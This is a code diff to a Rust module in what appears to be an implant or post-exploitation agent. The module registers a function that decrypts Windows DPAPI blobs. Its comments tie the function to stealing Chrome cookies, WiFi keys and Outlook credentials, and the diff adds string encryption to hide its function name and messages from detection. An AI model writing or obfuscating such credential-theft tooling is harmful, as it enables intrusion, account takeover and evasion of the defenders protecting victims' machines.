@@ -1,5 +1,7 @@
 // src/agent/scripting/dpapi.rs
 use rhai::Engine;
+use crate::strcrypt_rt;
+use strcrypt::aes_str;
 
 pub fn register(engine: &mut Engine) {
     // Decrypt a DPAPI-protected blob (Windows only).
@@ -10,7 +12,7 @@ pub fn register(engine: &mut Engine) {
     // Returns hex-encoded plaintext on success.
     // Use this after internal_chrome_cookies to decrypt the encrypted_value field,
     // or to unwrap WiFi PSKs, Outlook credentials, and similar DPAPI-protected material.
-    engine.register_fn("internal_dpapi_decrypt", |blob_hex: &str, entropy_hex: &str| -> String {
+    engine.register_fn(&aes_str!("internal_dpapi_decrypt"), |blob_hex: &str, entropy_hex: &str| -> String {
         #[cfg(target_os = "windows")]
         {
             let mut data = match hex::decode(blob_hex) {
@@ -52,6 +54,6 @@ pub fn register(engine: &mut Engine) {
             }
         }
         #[cfg(not(target_os = "windows"))]
-        "Error: DPAPI is Windows only".to_string()
+        aes_str!("Error: DPAPI is Windows only")
     });
 }
